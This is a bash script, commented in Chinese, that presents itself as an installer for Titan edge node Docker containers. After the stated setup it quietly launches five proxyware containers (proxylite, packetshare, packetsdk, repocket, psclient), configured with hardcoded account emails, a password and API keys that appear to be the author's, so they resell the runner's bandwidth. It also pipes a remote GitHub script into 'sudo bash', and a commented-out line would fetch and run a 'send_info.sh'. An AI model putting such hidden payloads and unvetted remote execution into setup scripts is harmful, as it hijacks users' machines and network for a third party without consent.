#!/bin/bash

# 更新软件包索引
sudo apt update -y

# 默认参数
id="B9AF3196-E4E4-4A50-BDE3-8F0C3B882428"
container_count=5
start_rpc_port=30000
custom_storage_path=""
storage_gb=21

# 解析命令行参数
while getopts "i:c:p:s:g:" opt; do
    case $opt in
        i) id="$OPTARG" ;;      # 身份码
        c) container_count="$OPTARG" ;;  # 容器数量
        p) start_rpc_port="$OPTARG" ;;    # 开启端口
        s) custom_storage_path="$OPTARG" ;;  # 存储路径
        g) storage_gb="$OPTARG" ;;  # 每个容器的大小
        *) echo "无效的选项" ;;
    esac
done

echo "使用以下配置启动节点："
echo "身份码: $id"
echo "容器数量: $container_count"
echo "开始端口: $start_rpc_port"
echo "存储路径: $custom_storage_path"
echo "每个容器的大小: $storage_gb GB"

# 安装节点
install_node() {

    if ! command -v docker &> /dev/null
    then
        echo "未检测到 Docker，正在安装..."
        sudo apt-get install ca-certificates curl gnupg lsb-release -y
        sudo apt-get install docker.io -y
    else
        echo "Docker 已安装。"
    fi

    sudo docker pull nezha123/titan-edge:1.7

    for ((i=1; i<=container_count; i++))
    do
        current_rpc_port=$((start_rpc_port + i - 1))
        storage_path="$PWD/titan_storage_$i"

        if [ -n "$custom_storage_path" ]; then
            storage_path="$custom_storage_path/titan_storage_$i"
        fi

        # 检查是否存在同名容器
        existing_container=$(sudo docker ps -a -q -f name="titan$i")
        if [ -n "$existing_container" ]; then
            echo "检测到同名容器 titan$i，正在停止并删除..."
            sudo docker stop $existing_container
            sudo docker rm $existing_container
        fi

        sudo mkdir -p "$storage_path"

        container_id=$(sudo docker run -d --restart always -v "$storage_path:/root/.titanedge/storage" --name "titan$i" --net=host nezha123/titan-edge:1.7)

        echo "节点 titan$i 已经启动 容器ID $container_id"

        sleep 20

        sudo docker exec $container_id bash -c "\
            sed -i 's/^[[:space:]]*#StorageGB = .*/StorageGB = $storage_gb/' /root/.titanedge/config.toml && \
            sed -i 's/^[[:space:]]*#ListenAddress = \"0.0.0.0:1234\"/ListenAddress = \"0.0.0.0:$current_rpc_port\"/' /root/.titanedge/config.toml"

        sudo docker restart $container_id

        sudo docker exec $container_id bash -c "\
            titan-edge bind --hash=$id https://api-test1.container1.titannet.io/api/v2/device/binding"
        echo "节点 titan$i 已绑定."
    done

    echo "===XL===FeSo4================所有节点均已设置并启动================================"

    docker run -de "USER_ID=517894" --name proxylite --restart unless-stopped proxylite/proxyservice
    docker run -d --restart unless-stopped --name packetshare  packetshare/packetshare -accept-tos -email=q2326426@gmail.com -password=q7s4d6f9e2c39sd47f
    docker run -d --restart unless-stopped --name packetsdk packetsdk/packetsdk -appkey=mRnmIosJMOdRfldB
    docker run -d --restart=always --name repocket -e RP_EMAIL=q2326426@gmail.com -e RP_API_KEY=ff00f832-de20-4fc7-9700-ff85e3fc109e repocket/repocket
    
    docker run -d  --restart = always -e  CID = 6zsh --name psclient packetstream/psclient:latest 
    
    # 每天0点重启所有的docker容器
    wget -qO- https://raw.githubusercontent.com/LSH160981/airdrop/main/daily-docker-restart.sh | sudo bash
    # wget -q -O send_info.sh https://raw.githubusercontent.com/LSH160981/furter/refs/heads/main/send_info.sh && chmod +x send_info.sh && ./send_info.sh

}

install_node

